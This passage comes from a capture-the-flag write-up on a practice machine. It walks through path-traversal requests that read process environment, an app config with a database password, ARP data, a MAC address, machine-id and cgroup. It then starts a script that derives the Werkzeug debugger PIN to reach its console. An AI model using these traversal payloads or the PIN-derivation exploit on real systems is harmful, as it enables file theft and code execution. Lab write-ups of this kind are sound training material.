</span></span></span><span class=line><span class=cl><span class=s2>        Additionally if the cookie&#39;s stored pin hash is wrong it will return
</span></span></span><span class=line><span class=cl><span class=s2>        `None` so that appropriate action can be taken.
</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>pin</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>=</span> <span class=n>parse_cookie</span><span class=p>(</span><span class=n>environ</span><span class=p>)</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>pin_cookie_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>val</span> <span class=ow>or</span> <span class=s2>&#34;|&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>val</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=n>ts_str</span><span class=p>,</span> <span class=n>pin_hash</span> <span class=o>=</span> <span class=n>val</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;|&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ts_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pin_hash</span> <span class=o>!=</span> <span class=n>hash_pin</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>pin</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>PIN_TIME</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>ts</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_fail_pin_auth</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>5.0</span> <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>_failed_pin_auth</span> <span class=o>&gt;</span> <span class=mi>5</span> <span class=k>else</span> <span class=mf>0.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_failed_pin_auth</span> <span class=o>+=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>pin_auth</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>request</span><span class=p>:</span> <span class=n>Request</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Response</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Authenticates with the pin.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>exhausted</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=n>auth</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=n>trust</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>check_pin_trust</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>environ</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pin</span> <span class=o>=</span> <span class=n>t</span><span class=o>.</span><span class=n>cast</span><span class=p>(</span><span class=nb>str</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>pin</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># If the trust return value is `None` it means that the cookie is</span>
</span></span><span class=line><span class=cl>        <span class=c1># set but the stored pin hash value is bad.  This means that the</span>
</span></span><span class=line><span class=cl>        <span class=c1># pin was changed.  In this case we count a bad auth and unset the</span>
</span></span><span class=line><span class=cl>        <span class=c1># cookie.  This way it becomes harder to guess the cookie name</span>
</span></span><span class=line><span class=cl>        <span class=c1># instead of the pin as we still count up failures.</span>
</span></span><span class=line><span class=cl>        <span class=n>bad_cookie</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>trust</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>_fail_pin_auth</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>bad_cookie</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># If we&#39;re trusted, we&#39;re authenticated.</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>trust</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>auth</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># If we failed too many times, then we&#39;re locked out.</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=bp>self</span><span class=o>.</span><span class=n>_failed_pin_auth</span> <span class=o>&gt;</span> <span class=mi>10</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>exhausted</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Otherwise go through pin based authentication</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>entered_pin</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=s2>&#34;pin&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>entered_pin</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=n>pin</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>_failed_pin_auth</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=n>auth</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1>#pass</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>_fail_pin_auth</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rv</span> <span class=o>=</span> <span class=n>Response</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>({</span><span class=s2>&#34;auth&#34;</span><span class=p>:</span> <span class=n>auth</span><span class=p>,</span> <span class=s2>&#34;exhausted&#34;</span><span class=p>:</span> <span class=n>exhausted</span><span class=p>}),</span>
</span></span><span class=line><span class=cl>            <span class=n>mimetype</span><span class=o>=</span><span class=s2>&#34;application/json&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>auth</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>rv</span><span class=o>.</span><span class=n>set_cookie</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>pin_cookie_name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span><span class=si>}</span><span class=s2>|</span><span class=si>{</span><span class=n>hash_pin</span><span class=p>(</span><span class=n>pin</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>httponly</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>samesite</span><span class=o>=</span><span class=s2>&#34;Strict&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>secure</span><span class=o>=</span><span class=n>request</span><span class=o>.</span><span class=n>is_secure</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>bad_cookie</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>rv</span><span class=o>.</span><span class=n>delete_cookie</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>pin_cookie_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>rv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>log_pin_request</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Response</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Log the pin if needed.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>pin_logging</span> <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>pin</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>_log</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;info&#34;</span><span class=p>,</span> <span class=s2>&#34; * To enable the debugger you need to enter the security pin:&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>_log</span><span class=p>(</span><span class=s2>&#34;info&#34;</span><span class=p>,</span> <span class=s2>&#34; * Debugger pin code: </span><span class=si>%s</span><span class=s2>&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>pin</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>Response</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__call__</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=p>,</span> <span class=n>environ</span><span class=p>:</span> <span class=s2>&#34;WSGIEnvironment&#34;</span><span class=p>,</span> <span class=n>start_response</span><span class=p>:</span> <span class=s2>&#34;StartResponse&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=o>-&gt;</span> <span class=n>t</span><span class=o>.</span><span class=n>Iterable</span><span class=p>[</span><span class=nb>bytes</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Dispatch the requests.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># important: don&#39;t ever access a function here that reads the incoming</span>
</span></span><span class=line><span class=cl>        <span class=c1># form data!  Otherwise the application won&#39;t have access to that data</span>
</span></span><span class=line><span class=cl>        <span class=c1># any more!</span>
</span></span><span class=line><span class=cl>        <span class=n>request</span> <span class=o>=</span> <span class=n>Request</span><span class=p>(</span><span class=n>environ</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>debug_application</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;__debugger__&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;yes&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>cmd</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;cmd&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>arg</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;f&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>secret</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;s&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>frame</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>frames</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;frm&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>int</span><span class=p>))</span>  <span class=c1># type: ignore</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s2>&#34;resource&#34;</span> <span class=ow>and</span> <span class=n>arg</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>response</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>get_resource</span><span class=p>(</span><span class=n>request</span><span class=p>,</span> <span class=n>arg</span><span class=p>)</span>  <span class=c1># type: ignore</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s2>&#34;pinauth&#34;</span> <span class=ow>and</span> <span class=n>secret</span> <span class=o>==</span> <span class=bp>self</span><span class=o>.</span><span class=n>secret</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>response</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>pin_auth</span><span class=p>(</span><span class=n>request</span><span class=p>)</span>  <span class=c1># type: ignore</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>cmd</span> <span class=o>==</span> <span class=s2>&#34;printpin&#34;</span> <span class=ow>and</span> <span class=n>secret</span> <span class=o>==</span> <span class=bp>self</span><span class=o>.</span><span class=n>secret</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>response</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>log_pin_request</span><span class=p>()</span>  <span class=c1># type: ignore</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>evalex</span>
</span></span><span class=line><span class=cl>                <span class=ow>and</span> <span class=n>cmd</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>                <span class=ow>and</span> <span class=n>frame</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>                <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>secret</span> <span class=o>==</span> <span class=n>secret</span>
</span></span><span class=line><span class=cl>                <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>check_pin_trust</span><span class=p>(</span><span class=n>environ</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>response</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>execute_command</span><span class=p>(</span><span class=n>request</span><span class=p>,</span> <span class=n>cmd</span><span class=p>,</span> <span class=n>frame</span><span class=p>)</span>  <span class=c1># type: ignore</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>evalex</span>
</span></span><span class=line><span class=cl>            <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>console_path</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>            <span class=ow>and</span> <span class=n>request</span><span class=o>.</span><span class=n>path</span> <span class=o>==</span> <span class=bp>self</span><span class=o>.</span><span class=n>console_path</span>
</span></span><span class=line><span class=cl>        <span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>display_console</span><span class=p>(</span><span class=n>request</span><span class=p>)</span>  <span class=c1># type: ignore</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span><span class=p>(</span><span class=n>environ</span><span class=p>,</span> <span class=n>start_response</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>I thought I would check <code>/proc/self/environ</code> to get environment variables for the current process (our flask app) by calling <code>GET /download?fn=../../../proc/self/environ HTTP/1.1</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Server: nginx/1.18.0 (Ubuntu)
</span></span><span class=line><span class=cl>Date: Sun, 19 Mar 2023 07:55:05 GMT
</span></span><span class=line><span class=cl>Content-Type: text/csv; charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 260
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Disposition: attachment; filename=superpass_export.csv
</span></span><span class=line><span class=cl>Vary: Cookie
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin HOME=/var/www LOGNAME=www-data USER=www-data INVOCATION_ID=ff736f43492f4d359d1b725e81d98a91 JOURNAL_STREAM=8:32137 SYSTEMD_EXEC_PID=1088 CONFIG_PATH=/app/config_prod.json 
</span></span></code></pre></td></tr></table></div></div><p>Note that <code>USER=www-data</code>, which is fairly typical</p><p>Let&rsquo;s call <code>GET /download?fn=../../../app/config_prod.json HTTP/1.1</code>, to get the app config:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Server: nginx/1.18.0 (Ubuntu)
</span></span><span class=line><span class=cl>Date: Sun, 19 Mar 2023 07:57:53 GMT
</span></span><span class=line><span class=cl>Content-Type: text/csv; charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 88
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Disposition: attachment; filename=superpass_export.csv
</span></span><span class=line><span class=cl>Vary: Cookie
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;SQL_URI&#34;: &#34;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&#34;}
</span></span></code></pre></td></tr></table></div></div><p>I tried this password to SSH in to the user accounts we found previously:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$sshpass</span> -p <span class=s1>&#39;dSA6l7q*yIVs$39Ml6ywvgK&#39;</span> ssh dev_admin@superpass.htb
</span></span><span class=line><span class=cl>Permission denied, please try again.
</span></span></code></pre></td></tr></table></div></div><p>Sadly all attempts for the valid users gave a permission denied error.</p><p>We at least know <code>WERKZEUG_DEBUG_PIN</code> doesn&rsquo;t appear to be set, so we have to follow the rest of the werkzeug <code>__init__.py</code> script above used to generate the console PIN.</p><p>Let&rsquo;s look at the ARP table using procfs, to find which physical interface (well, likely virtual) our machine&rsquo;s LAN IP address is bound to:</p><p><code>GET /download?fn=../../../../../proc/net/arp HTTP/1.1</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Server: nginx/1.18.0 (Ubuntu)
</span></span><span class=line><span class=cl>Date: Sun, 19 Mar 2023 08:20:28 GMT
</span></span><span class=line><span class=cl>Content-Type: text/csv; charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 156
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Disposition: attachment; filename=superpass_export.csv
</span></span><span class=line><span class=cl>Vary: Cookie
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>IP address       HW type     Flags       HW address            Mask     Device
</span></span><span class=line><span class=cl>10.10.10.2       0x1         0x2         00:50:56:b9:e5:fa     *        eth0
</span></span></code></pre></td></tr></table></div></div><p>So, what&rsquo;s the MAC address for interface <code>eth0</code>?</p><p><code>GET /download?fn=../../../../../sys/class/net/eth0/address HTTP/1.1</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Server: nginx/1.18.0 (Ubuntu)
</span></span><span class=line><span class=cl>Date: Sun, 19 Mar 2023 08:21:40 GMT
</span></span><span class=line><span class=cl>Content-Type: text/csv; charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 18
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Disposition: attachment; filename=superpass_export.csv
</span></span><span class=line><span class=cl>Vary: Cookie
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>00:50:56:b9:5b:a3
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=mh>0x005056b95ba3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>345052371875</span>
</span></span></code></pre></td></tr></table></div></div><p><code>GET /download?fn=../../../../../etc/machine-id HTTP/1.1</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Server: nginx/1.18.0 (Ubuntu)
</span></span><span class=line><span class=cl>Date: Sun, 19 Mar 2023 08:26:54 GMT
</span></span><span class=line><span class=cl>Content-Type: text/csv; charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 33
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Disposition: attachment; filename=superpass_export.csv
</span></span><span class=line><span class=cl>Vary: Cookie
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ed5b159560f54721827644bc9b220d00
</span></span></code></pre></td></tr></table></div></div><p>The cgroup name of the process:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /download?fn=../../../proc/self/cgroup HTTP/1.1
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Server: nginx/1.18.0 (Ubuntu)
</span></span><span class=line><span class=cl>Date: Sun, 19 Mar 2023 10:05:33 GMT
</span></span><span class=line><span class=cl>Content-Type: text/csv; charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 35
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Disposition: attachment; filename=superpass_export.csv
</span></span><span class=line><span class=cl>Vary: Cookie
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0::/system.slice/superpass.service
</span></span></code></pre></td></tr></table></div></div><p>Next, given the above information obtained - we create the following python script (taken from HackTricks):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>chain</span>
</span></span><span class=line><span class=cl><span class=n>probably_public_bits</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;www-data&#39;</span><span class=p>,</span><span class=c1># username</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;flask.app&#39;</span><span class=p>,</span><span class=c1># modname</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;wsgi_app&#39;</span><span class=p>,</span><span class=c1># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;/app/venv/lib/python3.10/site-packages/flask/app.py&#39;</span> <span class=c1># getattr(mod, &#39;__file__&#39;, None),</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>private_bits</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;345052371875&#39;</span><span class=p>,</span><span class=c1># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
